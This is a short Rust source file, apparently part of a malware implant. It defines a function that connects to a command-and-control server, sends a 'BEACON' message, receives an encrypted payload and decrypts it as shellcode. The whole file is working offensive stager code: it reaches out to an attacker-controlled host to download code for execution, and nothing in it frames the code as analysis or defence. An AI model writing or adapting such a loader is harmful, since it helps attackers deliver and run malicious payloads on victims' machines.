use std::net::{TcpStream};
use std::io::{Read, Write};
use crate::encryption;

pub fn fetch_payload_from_c2(ip: &str, port: u16, key: &[u8; 16], nonce: &[u8; 16]) -> Vec<u8> {
    let mut stream = TcpStream::connect((ip, port)).expect("Failed to connect to C2");

    // Send a beacon signal
    stream.write_all(b"BEACON").expect("Failed to send beacon");

    // Receive encrypted payload
    let mut buffer = vec![0; 4096];
    let len = stream.read(&mut buffer).expect("Failed to receive data");
    buffer.truncate(len);

    // Decrypt and return the shellcode
    encryption::decrypt_shellcode(&buffer, key, nonce)
}
